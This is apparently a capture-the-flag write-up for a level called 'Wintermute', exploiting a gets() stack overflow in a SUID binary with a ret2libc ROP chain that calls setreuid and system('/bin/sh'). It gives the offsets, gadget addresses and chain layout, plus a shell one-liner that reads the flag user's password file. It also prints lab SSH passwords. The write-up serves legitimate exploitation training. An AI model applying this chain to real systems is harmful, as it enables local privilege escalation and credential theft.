# level05 — "Wintermute" — `gets()` Overflow → ret2libc

## Concept

`./wintermute`, SUID owned by `flag05`, home dir `/home/level05/`. Same
vulnerability class as level03 — an unbounded `gets()` stack overflow —
but this level's real difficulty turned out to be the ROP chain's
stack-alignment requirement before calling `system()`, which behaves
differently for a privilege-escalating SUID execution than for a plain
one, and had to be found empirically rather than derived.

## Recon

Login: `ssh level05@127.0.0.1 -p 4244`, password = level04's flag
(`x0w8xdgapz3tjopq2s11a27yro7krazm`).

```
$ ls -la ~
-rwsr-x--- 1 flag05  level05 16416 wintermute
-r--r--r-- 1 level05 level05    35 wintermute.c
```

Source provided (`wintermute.c`, also in this `resources/`). The
vulnerable function:

```c
static void run_query(void)
{
    char query[QUERY_SIZE];   // QUERY_SIZE = 96
    ...
    gets(query);               // <-- unbounded read, the bug
    h = hash_query(query, strlen(query));
    ...
}
```

The rest of the program (`hash_query`, `process_matrix`, the `nodes[]`
table) is flavor/misdirection — none of it is reachable in a way that
matters for the exploit; `nm ./wintermute` confirms no hidden win-function
like level01 had.

`checksec --file=./wintermute`: Partial RELRO, no canary, NX
enabled, no PIE. `ldd ./wintermute` → same libc base as every prior
level, `0x7ffff7c00000`. `randomize_va_space` = 0.

`getent passwd flag05` → uid 1022 (checked fresh this time — level04
cost an enormous amount of time to a stale, wrong uid carried over from
old notes).

Disassembly of `run_query` (`gdb -batch -ex 'disas run_query'`) confirms
the frame: `sub $0x70,%rsp` (buffer is 0x70 = 112 bytes below `rbp`),
`lea -0x70(%rbp),%rax; call gets@plt`. Standard prologue means
`[rbp+0]`=saved rbp, `[rbp+8]`=return address, so the offset from the
start of `query` to the saved return address is `0x70 + 8 = 0x78 = 120`
bytes.

## Retrieving the addresses, command by command

`b"A"*120 + b"BBBBBBBB"` crashes cleanly on `0x4242424242424242` as the
return address, confirming the offset from the start of `query` to the
saved return address is exactly 120 bytes (matching the `sub $0x70,%rsp`
frame plus the 8-byte saved rbp found in Recon).

Since the libc base is identical to every prior level, the chain reuses
the already-verified gadget offsets from level03/level04 directly:
`pop rdi ; ret` @ `+0x10f78b`, `pop rsi ; pop rbp ; ret` @ `+0x2b46b`,
`setreuid` @ `+0x1270d0`, a plain `ret` @ `+0x2882f` used as a
stack-alignment fixup, `system` @ `+0x58750`, and libc's internal
`"/bin/sh"` string @ `+0x1cb42f`.

The number of alignment-fixup `ret`s needed before `system()` wasn't
derivable by analogy — level03 needed one, level04 needed none, and
neither assumption held here. `gdb -batch -ex 'run < payload' -ex bt`
on failing attempts consistently showed the fault inside `do_system` at
libc offset `0x5843b`, a `movaps %xmm0,0x50(%rsp)` instruction that
requires strict 16-byte stack alignment. The right count also isn't
something a same-privilege test copy can answer: a value that worked
cleanly against a non-SUID recompiled copy (confirmed via a real,
persistent `/bin/sh` process left blocked on stdin) still crashed against
the real, privilege-escalating SUID binary, so the count had to be swept
directly against the live target. Sweeping `n_extra_ret = 0..4` against
the real, SUID `wintermute` showed `n=0,1,2,4` all crashing with the same
`do_system`/`movaps` signature, while `n=3` returned exit code 124
(timeout) instead of a segfault — the signature of a hung process
blocked on stdin, i.e. a spawned shell waiting for input. Confirmed by
piping follow-up commands through the shell with timed writes between
them.

## Exploit

```
query overflow, offset 120:
  120 bytes junk
  pop rdi ; ret            (libc +0x10f78b)
  1022                     (flag05's real uid)
  pop rsi ; pop rbp ; ret  (libc +0x2b46b)
  1022
  0                        (junk, popped into rbp)
  setreuid                 (libc +0x1270d0)   <- setreuid(1022,1022) fires here
  pop rdi ; ret
  BINSH                    (libc +0x1cb42f, "/bin/sh")
  ret ; ret ; ret          (libc +0x2882f, THREE times — the alignment fix
                             this specific call path needs; found by
                             sweeping, not derived)
  system                   (libc +0x58750)
```

```
$ (cat payload.bin; sleep 0.5; echo "id > /tmp/proof"; sleep 0.3; \
   echo "cat /home/flag05/.pass >> /tmp/proof") | ./wintermute
$ cat /tmp/proof
uid=1022(flag05) gid=1008(level05) groups=1008(level05),1001(levelgroup)
67aaawdq0zcaaf3x57yh6irhvyjv3vs5
```

Verified: this string works as level06's SSH password.

